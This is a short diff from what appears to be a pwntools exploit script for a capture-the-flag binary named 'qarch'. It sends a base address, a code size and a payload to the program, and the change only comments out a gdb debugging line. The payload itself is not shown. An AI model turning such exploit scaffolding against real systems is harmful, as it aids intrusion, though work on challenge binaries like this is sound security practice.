@@ -626,7 +626,7 @@ s = process("./qarch", env={'LD_PRELOAD': "./lib/libunicorn.so.1"})
 s.sendlineafter("Base Address?", str(0x602000))
 s.sendafter("Code size?", str(len(payload)))
 # gdb.attach(s, "b *0x400ceb\nc")
-gdb.attach(s,"b disas_mov\nc")
+# gdb.attach(s,"b disas_mov\nc")
 # gdb.attach(s,"b *0x400ceb\nb helper_push\nc")
 
 s.sendafter("Code:", payload)
